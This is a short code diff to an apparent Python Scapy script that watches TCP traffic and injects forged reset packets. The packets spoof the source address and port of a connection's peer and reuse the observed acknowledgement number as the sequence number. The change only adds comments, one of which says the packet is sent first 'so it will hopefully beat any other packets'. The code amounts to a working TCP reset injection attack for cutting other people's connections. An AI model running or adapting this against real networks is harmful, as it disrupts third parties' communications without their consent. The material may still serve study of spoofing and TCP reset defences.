@@ -19,6 +19,7 @@ def logRST(p):
 
 
     sendRST(dst_ip, dst_port, src_ip, src_port, seq, ack, window)
+    #Send out packet first so it will hopefully beat any other packets
 
     print("---Found packet---\nsource: %s\nport: %s\nseq: %s\nack: %s"
           % (src_ip, src_port, seq, ack))
@@ -26,9 +27,10 @@ def logRST(p):
     return True
 
 
+
 def sendRST(dst_ip, dst_port, src_ip, src_port, seq, ack, window):
-    ip = IP(src=dst_ip, dst=src_ip)
-    tcp = TCP(sport=dst_port, dport=src_port, flags="R", window=window, seq=ack)  # Fix seq + ack
+    ip = IP(src=dst_ip, dst=src_ip) #Build the IP portion
+    tcp = TCP(sport=dst_port, dport=src_port, flags="R", window=window, seq=ack)
     p = Ether() / ip / tcp
     sendp(p, iface="en0")
 
